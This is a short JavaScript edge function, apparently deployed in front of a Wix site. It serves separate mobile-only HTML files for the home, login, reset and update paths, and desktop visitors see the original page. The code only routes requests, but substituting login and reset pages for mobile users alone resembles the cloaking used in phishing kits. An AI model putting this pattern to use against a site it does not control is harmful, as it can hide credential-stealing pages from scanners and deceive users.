export default async (request, context) => {
  const ua = request.headers.get('user-agent') || '';
  const isMobile = /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);

  if (!isMobile) {
    return; // Desktop - show normal Wix page
  }

  const url = new URL(request.url);
  const path = url.pathname;

  // Map Wix pages to mobile versions only
  const mobileMap = {
    '/': '/mobile/index.html',
    '/login': '/mobile/login.html',
    '/reset': '/mobile/reset.html',
    '/update': '/mobile/update.html',
  };

  const mobilePath = mobileMap[path];
  if (mobilePath) {
    const mobileUrl = new URL(mobilePath, url.origin);
    return fetch(mobileUrl.toString(), request);
  }

  return; // All other pages pass through normally
};
